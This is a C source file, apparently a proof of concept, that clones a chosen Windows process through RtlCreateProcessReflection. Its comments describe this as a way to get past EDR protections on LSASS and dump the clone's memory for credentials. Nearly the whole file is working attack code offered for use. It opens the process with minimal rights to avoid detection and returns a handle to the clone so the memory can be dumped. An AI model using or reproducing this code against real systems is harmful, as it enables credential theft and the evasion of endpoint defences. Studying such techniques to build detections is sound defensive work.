#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE Process;
    HANDLE Thread;
    CLIENT_ID ClientId;
    // ... padding and other fields omitted for PoC
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef NTSTATUS(NTAPI* fnRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    PRTL_USER_PROCESS_INFORMATION ReflectionInformation
);

// Fox's Process Reflection PoC (Dirty Vanity concept)
int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return -1;
    }

    DWORD targetPid = atoi(argv[1]);
    printf("[+] Attempting to clone PID: %lu\n", targetPid);

    // 1. We only need PROCESS_CREATE_PROCESS, not PROCESS_VM_READ!
    // This bypasses many EDR ObRegisterCallbacks that block read access to LSASS.
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Failed to open process. Error: %lu\n", GetLastError());
        return -1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnRtlCreateProcessReflection pRtlCreateProcessReflection = 
        (fnRtlCreateProcessReflection)GetProcAddress(hNtdll, "RtlCreateProcessReflection");

    if (!pRtlCreateProcessReflection) {
        printf("[-] Failed to resolve RtlCreateProcessReflection.\n");
        CloseHandle(hProcess);
        return -1;
    }

    RTL_USER_PROCESS_INFORMATION cloneInfo = { 0 };
    cloneInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);

    printf("[+] Calling RtlCreateProcessReflection...\n");
    
    // 2. Ask the kernel to fork the process
    NTSTATUS status = pRtlCreateProcessReflection(
        hProcess,
        RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
        NULL,
        NULL,
        NULL,
        &cloneInfo
    );

    if (status >= 0) { // NT_SUCCESS
        printf("[!] Process successfully cloned!\n");
        printf("[!] Clone PID: %lu\n", (DWORD)(ULONG_PTR)cloneInfo.ClientId.UniqueProcess);
        printf("[!] Clone Handle: %p\n", cloneInfo.Process);
        
        // 3. Now you can use MiniDumpWriteDump on cloneInfo.Process 
        // The EDR is guarding the original LSASS, not this new clone.
        // The clone shares the exact same memory pages (Copy-on-Write).
        printf("[+] Memory is identical to target. Safe to dump or inspect.\n");

        // 4. Cleanup: Kill the clone when done so we don't leave a zombie
        TerminateProcess(cloneInfo.Process, 0);
        CloseHandle(cloneInfo.Process);
        CloseHandle(cloneInfo.Thread);
    } else {
        printf("[-] RtlCreateProcessReflection failed with status: 0x%08X\n", status);
    }

    CloseHandle(hProcess);
    return 0;
}